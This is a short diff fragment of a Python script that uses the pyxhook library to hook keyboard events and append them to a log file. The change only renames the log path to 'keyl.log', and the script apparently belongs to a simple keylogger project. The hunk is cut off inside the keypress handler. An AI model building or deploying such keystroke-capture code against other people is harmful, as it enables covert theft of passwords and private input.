@@ -1,7 +1,7 @@
 import pyxhook
 import os
      #change here \/
-log_file='/home/rounak/Desktop/file.log'
+log_file='/home/rounak/Desktop/keyl.log'
 
 def keypress(event):
   fob=open(log_file,'a')
